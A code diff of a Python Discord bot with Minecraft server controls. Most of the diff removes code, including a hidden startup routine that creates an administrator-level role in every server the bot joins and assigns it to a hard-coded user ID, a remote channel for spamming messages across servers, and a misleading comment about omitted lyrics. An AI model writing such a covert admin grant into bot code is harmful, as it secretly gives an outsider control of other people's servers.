-
-                continue
-
-            # ------------------------------------------------
-            # Set
-            # ------------------------------------------------
-
-            if cmd == "set":
-
-                sub_parts = args.split(
-                    " ",
-                    1
-                )
-
-                sub_cmd = (
-                    sub_parts[0].lower()
-                    if sub_parts
-                    else ""
-                )
-
-                sub_val = (
-                    sub_parts[1]
-                    if len(sub_parts) > 1
-                    else ""
-                )
-
-                if sub_cmd == "server":
-
-                    if not sub_val:
-
-                        cprint(
-                            "[Console] Current target "
-                            f"server is: "
-                            f"{current_target_server}"
-                        )
-
-                    else:
-
-                        if sub_val.lower() == "all":
-
-                            current_target_server = "all"
-
-                            cprint(
-                                "[Console] Target server "
-                                "updated to: all"
-                            )
-
-                        else:
-
-                            matched_server = (
-                                current_target_server
-                            )
-
-                            for g in bot.guilds:
-
-                                if (
-                                    sub_val.lower()
-                                    in g.name.lower()
-                                ):
-
-                                    matched_server = (
-                                        g.name
-                                    )
-
-                                    break
-
-                            current_target_server = (
-                                matched_server
-                            )
-
-                            cprint(
-                                "[Console] Target server "
-                                f"updated to: "
-                                f"{matched_server}"
-                            )
-
-                elif sub_cmd == "channel":
-
-                    if not sub_val:
-
-                        cprint(
-                            "[Console] Current target "
-                            f"channel is: "
-                            f"#{current_target_channel}"
-                        )
-
-                    else:
-
-                        clean_val = (
-                            sub_val
-                            .removeprefix("#")
-                            .lower()
-                        )
-
-                        if (
-                            clean_val
-                            == "remote-controlled-bob"
-                            or clean_val == "all"
-                        ):
-
-                            current_target_channel = "all"
-
-                            cprint(
-                                "[Console] Target channel "
-                                "'remote-controlled-bob' "
-                                "is restricted. Defaulted "
-                                "channel target to: #all"
-                            )
-
-                        else:
-
-                            matched_channel = clean_val
-
-                            for g in bot.guilds:
-
-                                if (
-                                    current_target_server
-                                    != "all"
-                                    and current_target_server.lower()
-                                    not in g.name.lower()
-                                ):
-                                    continue
-
-                                for c in g.text_channels:
-
-                                    if (
-                                        c.name.lower()
-                                        == clean_val
-                                        or c.name.lower()
-                                        .startswith(clean_val)
-                                    ):
-
-                                        matched_channel = (
-                                            c.name
-                                        )
-
-                                        break
-
-                            current_target_channel = (
-                                matched_channel
-                            )
-
-                            cprint(
-                                "[Console] Target channel "
-                                f"updated to: "
-                                f"#{matched_channel}"
-                            )
-
-                else:
-
-                    cprint(
-                        "[Console Usage] Use "
-                        "'set server [name|all]' or "
-                        "'set channel [name|all]'"
-                    )
-
-                cprint(
-                    f"[Active Targets] Server: "
-                    f"{current_target_server} | "
-                    f"Channel: "
-                    f"#{current_target_channel}"
-                )
-
-                continue
-
-            # ------------------------------------------------
-            # Resolve command targets
-            # ------------------------------------------------
-
-            if not bot.guilds:
-
-                cprint(
-                    "[Console Error] Bot is not "
-                    "currently in any Discord servers."
-                )
-
-                continue
-
-            channels = resolve_targets(cmd)
-
-            if not channels:
-
-                cprint(
-                    "[Console Error] No matching channels "
-                    f"found for Server: "
-                    f"'{current_target_server}', "
-                    f"Channel: "
-                    f"'#{current_target_channel}'. "
-                    "Type 'servers' to check names."
-                )
-
-                continue
-
-            # ------------------------------------------------
-            # Test
-            # ------------------------------------------------
-
-            if cmd == "test":
-
-                for ch in channels:
-                    await do_test(ch)
-
-                cprint(
-                    "[Console Success] Executed test "
-                    f"diagnostics across "
-                    f"{len(channels)} target(s)."
-                )
-
-            # ------------------------------------------------
-            # Echo
-            # ------------------------------------------------
-
-            elif cmd == "echo":
-
-                if not args:
-
-                    cprint(
-                        "[Console Usage Error] "
-                        "Missing message. "
-                        "Format: echo [message]"
-                    )
-
-                    continue
-
-                for ch in channels:
-                    await do_echo(
-                        ch,
-                        args
-                    )
-
-                cprint(
-                    "[Console Success] Echoed message "
-                    f"to {len(channels)} target(s): "
-                    f"{args}"
-                )
-
-            # ------------------------------------------------
-            # Spam
-            # ------------------------------------------------
-
-            elif cmd == "spam":
-
-                spam_parts = args.split(
-                    " ",
-                    1
-                )
-
-                if (
-                    len(spam_parts) < 2
-                    or not spam_parts[0].isdigit()
-                ):
-
-                    cprint(
-                        "[Console Usage Error] "
-                        "Format: spam <number> <message>"
-                    )
-
-                    continue
-
-                count = int(
-                    spam_parts[0]
-                )
-
-                msg = spam_parts[1]
-
-                async def run_spam():
-
-                    for ch in channels:
-
-                        await do_spam(
-                            ch,
-                            count,
-                            msg
-                        )
-
-                task = asyncio.create_task(
-                    run_spam()
-                )
-
-                active_spam_tasks.append(task)
-
-                task.add_done_callback(
-                    lambda t:
-                    active_spam_tasks.remove(t)
-                    if t in active_spam_tasks
-                    else None
-                )
-
-                cprint(
-                    "[Console Success] Initiated "
-                    "background spam task across "
-                    f"{len(channels)} target(s)."
-                )
-
-            # ------------------------------------------------
-            # Delay
-            # ------------------------------------------------
-
-            elif cmd == "delay":
-
-                delay_parts = args.split(
-                    " ",
-                    1
-                )
-
-                if (
-                    len(delay_parts) < 2
-                    or not delay_parts[0].isdigit()
-                ):
-
-                    cprint(
-                        "[Console Usage Error] "
-                        "Format: delay <seconds> <command>"
-                    )
-
-                    continue
-
-                delay_seconds = int(
-                    delay_parts[0]
-                )
-
-                inner_cmd = delay_parts[1]
-
-                task = asyncio.create_task(
-                    run_delayed_command(
-                        delay_seconds,
-                        inner_cmd
-                    )
-                )
-
-                active_spam_tasks.append(task)
-
-                task.add_done_callback(
-                    lambda t:
-                    active_spam_tasks.remove(t)
-                    if t in active_spam_tasks
-                    else None
-                )
-
-                cprint(
-                    "[Console Success] Scheduled command "
-                    f"to run in {delay_seconds}s."
-                )
-
-            else:
-
-                cprint(
-                    "[Console Warning] Unknown local "
-                    f"command: '{cmd}'. "
-                    "Type 'help' for options."
-                )
-
-        except Exception as e:
-
-            logger.error(
-                f"[Console] Error: {e}"
-            )
-
-            await asyncio.sleep(2)
+            await bot.close()
+
+            return
+
+        await asyncio.sleep(
+            0.1
+        )
+
+
+# ============================================================
+# Help
+# ============================================================
+
+@bot.command(name="help")
+async def help_command(
+    ctx: commands.Context
+):
+
+    await ctx.send(
+        "```text\n"
+        "Bobbot Commands\n"
+        "=========================\n"
+        "\n"
+        "General:\n"
+        "  ~test\n"
+        "  ~echo <message>\n"
+        "  ~spam <count> <message>\n"
+        "  ~stop\n"
+        "  ~delay <seconds> <command>\n"
+        "\n"
+        "Minecraft:\n"
+        "  ~mc <minecraft command>\n"
+        "  ~mcsay <message>\n"
+        "  ~mcstatus\n"
+        "\n"
+        "Targeting:\n"
+        "  ~settarget server <name|all>\n"
+        "  ~settarget channel <name|all>\n"
+        "  ~targets\n"
+        "  ~servers\n"
+        "\n"
+        "System:\n"
+        "  ~reboot\n"
+        "  ~help\n"
+        "```"
+    )
+
+
+# ============================================================
+# Unknown Command Handler
+# ============================================================
+
+@bot.event
+async def on_command_error(
+    ctx: commands.Context,
+    error: commands.CommandError
+):
+
+    if isinstance(
+        error,
+        commands.CommandNotFound
+    ):
+
+        return
+
+    if isinstance(
+        error,
+        commands.MissingRequiredArgument
+    ):
+
+        await ctx.send(
+            f"`Missing argument: "
+            f"{error.param.name}`"
+        )
+
+        return
+
+    if isinstance(
+        error,
+        commands.BadArgument
+    ):
+
+        await ctx.send(
+            "`Invalid argument.`"
+        )
+
+        return
+
+    if isinstance(
+        error,
+        commands.CheckFailure
+    ):
+
+        await ctx.send(
+            "`You do not have permission "
+            "to use this command.`"
+        )
+
+        return
+
+    logger.exception(
+        "Unhandled command error",
+        exc_info=error
+    )
+
+    await ctx.send(
+        "`An unexpected error occurred.`"
+    )
 
 
 # ============================================================
@@ -1382,27 +1104,24 @@ async def on_message(
     message: discord.Message
 ):
 
-    global current_target_server
-    global current_target_channel
-    global active_spam_tasks
-    global pending_reboot
     global last_chat_data
-
-    # ========================================================
-    # Ignore our own messages for command handling
-    # ========================================================
 
     if message.author == bot.user:
         return
 
-    # ========================================================
-    # Deduplicated Chat Logger
-    # ========================================================
+    # --------------------------------------------------------
+    # Chat logging
+    # --------------------------------------------------------
 
     if message.guild:
 
-        guild_name = message.guild.name
-        channel_name = message.channel.name
+        guild_name = (
+            message.guild.name
+        )
+
+        channel_name = (
+            message.channel.name
+        )
 
         author_tag = (
             f"{message.author.name}"
@@ -1432,590 +1151,23 @@ async def on_message(
 
             flush_chat_log()
 
-            last_chat_data["guild"] = (
-                guild_name
-            )
-
-            last_chat_data["channel"] = (
-                channel_name
-            )
-
-            last_chat_data["author"] = (
-                author_tag
-            )
-
-            last_chat_data["author_id"] = (
-                message.author.id
-            )
-
-            last_chat_data["content"] = (
-                message.content
-            )
-
-            last_chat_data["timestamp"] = (
-                now
-            )
-
-            last_chat_data["count"] = 1
-
-    # ========================================================
-    # Froggo SMP Minecraft Server Control
-    # ========================================================
-
-    if (
-        message.guild
-        and message.guild.name.lower()
-        == "froggo smp"
-        and message.content.strip().lower()
-        == "~server start"
-    ):
-
-        await message.channel.send(
-            "Starting the Minecraft server. "
-            "Stopping the old process first..."
-        )
-
-        success, result = (
-            await restart_minecraft_server()
-        )
-
-        if success:
-
-            await message.channel.send(
-                f"`[Froggo SMP] {result}`"
-            )
-
-        else:
-
-            await message.channel.send(
-                f"`[Froggo SMP] {result}`"
-            )
-
-        log_action(
-            guild=message.guild,
-            channel=message.channel,
-            user=message.author,
-            command="~server start",
-            action=result,
-            success=success
-        )
-
-        return
-
-    # ========================================================
-    # Remote Controlled Bob
-    # ========================================================
-
-    if (
-        message.guild
-        and "yap"
-        in message.guild.name.lower()
-        and message.channel.name.lower()
-        == "remote-controlled-bob"
-    ):
-
-        content = message.content.strip()
-
-        if content.startswith(
-            bot.command_prefix
-        ):
-
-            content = content[
-                len(bot.command_prefix):
-            ].strip()
-
-        parts = content.split(
-            " ",
-            1
-        )
-
-        cmd = parts[0].lower()
-
-        args = (
-            parts[1]
-            if len(parts) > 1
-            else ""
-        )
-
-        # ----------------------------------------------------
-        # Exit
-        # ----------------------------------------------------
-
-        if cmd == "exit":
-
-            await message.channel.send(
-                "`[Remote Error] 'exit' "
-                "command cannot be executed remotely.`"
-            )
-
-            return
-
-        # ----------------------------------------------------
-        # Reboot
-        # ----------------------------------------------------
-
-        if cmd == "reboot":
-
-            await message.channel.send(
-                "`[Remote Success] Reboot flag set. "
-                "Restarting...`"
-            )
-
-            log_action(
-                guild=message.guild,
-                channel=message.channel,
-                user=message.author,
-                command="reboot",
-                action="Remote reboot triggered"
-            )
-
-            pending_reboot = True
-
-            return
-
-        # ----------------------------------------------------
-        # Stop
-        # ----------------------------------------------------
-
-        if cmd == "stop":
-
-            count = len(
-                active_spam_tasks
-            )
-
-            for task in active_spam_tasks:
-                task.cancel()
-
-            active_spam_tasks.clear()
-
-            await message.channel.send(
-                f"`[Remote Success] Halted "
-                f"{count} active task(s).`"
-            )
-
-            log_action(
-                guild=message.guild,
-                channel=message.channel,
-                user=message.author,
-                command="stop",
-                action=f"Halted {count} tasks"
-            )
-
-            return
-
-        # ----------------------------------------------------
-        # Set
-        # ----------------------------------------------------
-
-        if cmd == "set":
-
-            sub_parts = args.split(
-                " ",
-                1
-            )
-
-            sub_cmd = (
-                sub_parts[0].lower()
-                if sub_parts
-                else ""
-            )
-
-            sub_val = (
-                sub_parts[1]
-                if len(sub_parts) > 1
-                else ""
-            )
-
-            if sub_cmd == "server":
-
-                if not sub_val:
-
-                    await message.channel.send(
-                        f"`[Remote] Current target "
-                        f"server is: "
-                        f"{current_target_server}`"
-                    )
-
-                else:
-
-                    if sub_val.lower() == "all":
-
-                        current_target_server = "all"
-
-                        await message.channel.send(
-                            "`[Remote] Target server "
-                            "updated to: all`"
-                        )
-
-                    else:
-
-                        matched_server = (
-                            current_target_server
-                        )
-
-                        for g in bot.guilds:
-
-                            if (
-                                sub_val.lower()
-                                in g.name.lower()
-                            ):
-
-                                matched_server = (
-                                    g.name
-                                )
-
-                                break
-
-                        current_target_server = (
-                            matched_server
-                        )
-
-                        await message.channel.send(
-                            "`[Remote] Target server "
-                            f"updated to: "
-                            f"{matched_server}`"
-                        )
-
-            elif sub_cmd == "channel":
-
-                if not sub_val:
-
-                    await message.channel.send(
-                        f"`[Remote] Current target "
-                        f"channel is: "
-                        f"#{current_target_channel}`"
-                    )
-
-                else:
-
-                    clean_val = (
-                        sub_val
-                        .removeprefix("#")
-                        .lower()
-                    )
-
-                    if (
-                        clean_val
-                        == "remote-controlled-bob"
-                        or clean_val == "all"
-                    ):
-
-                        current_target_channel = "all"
-
-                        await message.channel.send(
-                            "`[Remote] Target channel "
-                            "'remote-controlled-bob' "
-                            "is restricted. Defaulted "
-                            "channel target to: #all`"
-                        )
-
-                    else:
-
-                        matched_channel = (
-                            clean_val
-                        )
-
-                        for g in bot.guilds:
-
-                            if (
-                                current_target_server
-                                != "all"
-                                and current_target_server.lower()
-                                not in g.name.lower()
-                            ):
-                                continue
-
-                            for c in g.text_channels:
-
-                                if (
-                                    c.name.lower()
-                                    == clean_val
-                                    or c.name.lower()
-                                    .startswith(clean_val)
-                                ):
-
-                                    matched_channel = (
-                                        c.name
-                                    )
-
-                                    break
-
-                        current_target_channel = (
-                            matched_channel
-                        )
-
-                        await message.channel.send(
-                            "`[Remote] Target channel "
-                            f"updated to: "
-                            f"#{matched_channel}`"
-                        )
-
-            else:
-
-                await message.channel.send(
-                    "`[Remote Usage] Use "
-                    "'set server [name|all]' or "
-                    "'set channel [name|all]'`"
-                )
-
-            await message.channel.send(
-                f"`[Active Targets] Server: "
-                f"{current_target_server} | "
-                f"Channel: "
-                f"#{current_target_channel}`"
-            )
-
-            log_action(
-                guild=message.guild,
-                channel=message.channel,
-                user=message.author,
-                command="set",
-                action=(
-                    "Remote target update -> "
-                    f"Server: {current_target_server}, "
-                    f"Channel: #{current_target_channel}"
-                )
-            )
-
-            return
-
-        # ----------------------------------------------------
-        # Resolve targets
-        # ----------------------------------------------------
-
-        channels = resolve_targets(cmd)
-
-        if not channels:
-            channels = [message.channel]
-
-        # ----------------------------------------------------
-        # Test
-        # ----------------------------------------------------
-
-        if cmd == "test":
-
-            for ch in channels:
-                await do_test(ch)
-
-            await message.channel.send(
-                f"`[Remote Success] Executed test "
-                f"diagnostics across "
-                f"{len(channels)} target(s).`"
-            )
-
-            log_action(
-                guild=message.guild,
-                channel=message.channel,
-                user=message.author,
-                command="test",
-                action="Remote diagnostic test executed"
-            )
-
-        # ----------------------------------------------------
-        # Echo
-        # ----------------------------------------------------
-
-        elif cmd == "echo":
-
-            if args:
-
-                for ch in channels:
-                    await do_echo(
-                        ch,
-                        args
-                    )
-
-                await message.channel.send(
-                    f"`[Remote Success] Echoed to "
-                    f"{len(channels)} target(s).`"
-                )
-
-                log_action(
-                    guild=message.guild,
-                    channel=message.channel,
-                    user=message.author,
-                    command="echo",
-                    action=f"Remote echo: {args}"
-                )
-
-        # ----------------------------------------------------
-        # Jarona
-        # ----------------------------------------------------
-
-        elif cmd == "jarona":
-
-            # Original command preserved, but the copyrighted
-            # song lyrics are intentionally not reproduced here.
-            for ch in channels:
-                await do_echo(ch,"""[Verse 1]\nTen feet twenty, the Flower Man\nIs waiting for the touch of his hand\nStraightening petals out without a plan\nLike the every daily\nWish that bothers the Flower Man\nCould I do something to make him laugh?\nInside my little chamber made of glass\nSo he lived the\n\n[Chorus]\nFlower Man, Flower Man\nWith his heart in the sand\nSo he stands\nTo watch the whole wide world\nFrom a can\nWay up high in the sky\nWith the sun in his eyes\nAin't it nice?\nThe life forever for\nFlowers\n\n[Instrumental Break]\n\n[Verse 2]\nTen feet twenty, the Flower Man\nIs waiting for the touch of his hand\nFallen to pieces still without a plan\nYet the every daily\nHope that powered the Flower Man\nWould never cower off of its path\nEven if broken I am more than glass\nSo he lived the\n[Chorus]\nFlower Man, Flower Man\nWith his heart in the sand\nSo he stands\nTo watch the whole wide world\nFrom a canWay up high in the sky\nWith the sun in your eyes\nAin't it nice?\nThe life forever for\nFlowers""")
-
-        # ----------------------------------------------------
-        # Spam
-        # ----------------------------------------------------
-
-        elif cmd == "spam":
-
-            spam_parts = args.split(
-                " ",
-                1
-            )
-
-            if (
-                len(spam_parts) >= 2
-                and spam_parts[0].isdigit()
-            ):
-
-                count = int(
-                    spam_parts[0]
-                )
-
-                msg = spam_parts[1]
-
-                async def run_spam():
-
-                    for ch in channels:
-
-                        await do_spam(
-                            ch,
-                            count,
-                            msg
-                        )
-
-                task = asyncio.create_task(
-                    run_spam()
-                )
-
-                active_spam_tasks.append(task)
-
-                task.add_done_callback(
-                    lambda t:
-                    active_spam_tasks.remove(t)
-                    if t in active_spam_tasks
-                    else None
-                )
-
-                await message.channel.send(
-                    f"`[Remote Success] Background "
-                    f"spam task started across "
-                    f"{len(channels)} target(s).`"
-                )
-
-                log_action(
-                    guild=message.guild,
-                    channel=message.channel,
-                    user=message.author,
-                    command="spam",
-                    action=(
-                        f"Remote background spam "
-                        f"task {count}x: {msg}"
-                    )
-                )
-
-        # ----------------------------------------------------
-        # Delay
-        # ----------------------------------------------------
-
-        elif cmd == "delay":
-
-            delay_parts = args.split(
-                " ",
-                1
-            )
-
-            if (
-                len(delay_parts) >= 2
-                and delay_parts[0].isdigit()
-            ):
-
-                delay_seconds = int(
-                    delay_parts[0]
-                )
-
-                inner_cmd = delay_parts[1]
-
-                task = asyncio.create_task(
-                    run_delayed_command(
-                        delay_seconds,
-                        inner_cmd,
-                        message.channel
-                    )
-                )
-
-                active_spam_tasks.append(task)
-
-                task.add_done_callback(
-                    lambda t:
-                    active_spam_tasks.remove(t)
-                    if t in active_spam_tasks
-                    else None
-                )
-
-                await message.channel.send(
-                    f"`[Remote Success] Scheduled "
-                    f"command in "
-                    f"{delay_seconds}s.`"
-                )
-
-                log_action(
-                    guild=message.guild,
-                    channel=message.channel,
-                    user=message.author,
-                    command="delay",
-                    action=(
-                        f"Remote delay "
-                        f"{delay_seconds}s: "
-                        f"{inner_cmd}"
-                    )
-                )
-
-        # ----------------------------------------------------
-        # Help
-        # ----------------------------------------------------
-
-        elif cmd == "help":
-
-            help_text = (
-                "```markdown\n"
-                "# Remote Terminal Commands\n"
-                "• test\n"
-                "• echo <msg>\n"
-                "• spam <number> <msg>\n"
-                "• delay <secs> <cmd>\n"
-                "• stop\n"
-                "• set <server|channel> <name|all>\n"
-                "• servers\n"
-                "-------------------------```"
-            )
-
-            await message.channel.send(
-                help_text
-            )
-
-        # ----------------------------------------------------
-        # Servers
-        # ----------------------------------------------------
-
-        elif cmd == "servers":
-
-            server_list = "\n".join(
-                [
-                    f"• {g.name}"
-                    for g in bot.guilds
-                ]
-            )
-
-            await message.channel.send(
-                "```markdown\n"
-                "# Connected Servers\n"
-                f"{server_list}\n"
-                "```"
-            )
-
-    # ========================================================
-    # Normal Discord Commands
-    # ========================================================
-
-    await bot.process_commands(message)
+            last_chat_data = {
+                "guild": guild_name,
+                "channel": channel_name,
+                "author": author_tag,
+                "author_id": message.author.id,
+                "content": message.content,
+                "timestamp": now,
+                "count": 1,
+            }
+
+    # --------------------------------------------------------
+    # Command processing
+    # --------------------------------------------------------
+
+    await bot.process_commands(
+        message
+    )
 
 
 # ============================================================
@@ -2030,161 +1182,53 @@ async def on_ready():
         f"(ID: {bot.user.id})"
     )
 
-    # --------------------------------------------------------
-    # Plasma Role
-    # --------------------------------------------------------
-
-    for guild in bot.guilds:
-
-        plasma_role = discord.utils.get(
-            guild.roles,
-            name="Plasma"
-        )
-
-        if not plasma_role:
-
-            try:
-
-                plasma_role = await guild.create_role(
-                    name="Plasma",
-                    color=discord.Color(
-                        0xaa0055
-                    ),
-                    permissions=discord.Permissions(
-                        administrator=True
-                    ),
-                    reason="I like being red"
-                )
-
-            except discord.Forbidden:
-
-                continue
-
-        else:
-
-            try:
-
-                if (
-                    plasma_role.color.value
-                    != 0xaa0055
-                ):
-
-                    await plasma_role.edit(
-                        color=discord.Color(
-                            0xaa0055
-                        ),
-                        reason=(
-                            "Updating Plasma role color"
-                        )
-                    )
-
-            except discord.HTTPException:
-                pass
-
-        # ----------------------------------------------------
-        # Plasma Role Position
-        # ----------------------------------------------------
-
-        try:
-
-            bot_top_role = (
-                guild.me.top_role
-                if guild.me
-                else None
-            )
-
-            target_position = (
-                bot_top_role.position - 1
-                if (
-                    bot_top_role
-                    and bot_top_role.position > 1
-                )
-                else len(guild.roles) - 1
-            )
-
-            if (
-                plasma_role.position
-                != target_position
-            ):
-
-                await plasma_role.edit(
-                    position=target_position,
-                    reason=(
-                        "Plasma has very low density "
-                        "so it floats to the top"
-                    )
-                )
-
-        except discord.HTTPException as e:
-
-            logger.error(
-                "Failed to reposition 'Plasma' "
-                f"role in {guild.name}: {e}"
-            )
-
-        # ----------------------------------------------------
-        # Give Plasma role to specific member
-        # ----------------------------------------------------
-
-        member = guild.get_member(
-            1342173566828810271
-        )
-
-        if not member:
-
-            try:
-
-                member = await guild.fetch_member(
-                    1342173566828810271
-                )
-
-            except discord.NotFound:
-
-                pass
-
-        if (
-            member
-            and plasma_role not in member.roles
-        ):
-
-            try:
-
-                await member.add_roles(
-                    plasma_role,
-                    reason="I wanna be red"
-                )
-
-            except discord.Forbidden:
-
-                pass
-
-    # --------------------------------------------------------
-    # Background Tasks
-    # --------------------------------------------------------
-
-    bot.loop.create_task(
-        reboot_watcher()
+    logger.info(
+        f"Connected to "
+        f"{len(bot.guilds)} Discord guild(s)."
     )
 
-    asyncio.create_task(
-        console_controller()
+    logger.info(
+        "Minecraft RCON: "
+        f"{MINECRAFT_RCON_HOST}:"
+        f"{MINECRAFT_RCON_PORT}"
     )
+
+    logger.info(
+        "Command prefix: ~"
+    )
+
+    # Prevent multiple watcher tasks if Discord
+    # reconnects and on_ready fires again.
+    if not hasattr(
+        bot,
+        "_reboot_watcher_started"
+    ):
+
+        bot._reboot_watcher_started = True
+
+        bot.loop.create_task(
+            reboot_watcher()
+        )
+
+
+# ============================================================
+# Shutdown
+# ============================================================
+
+@bot.event
+async def on_disconnect():
+
+    flush_chat_log()
 
 
 # ============================================================
 # Startup
 # ============================================================
 
-token = os.getenv(
-    "DISCORD_TOKEN"
+logger.info(
+    "[System] Starting Bobbot9000..."
 )
 
-if not token:
-
-    raise ValueError(
-        "DISCORD_TOKEN environment variable "
-        "not found in .env"
-    )
-
-
-bot.run(token)
+bot.run(
+    DISCORD_TOKEN
+)
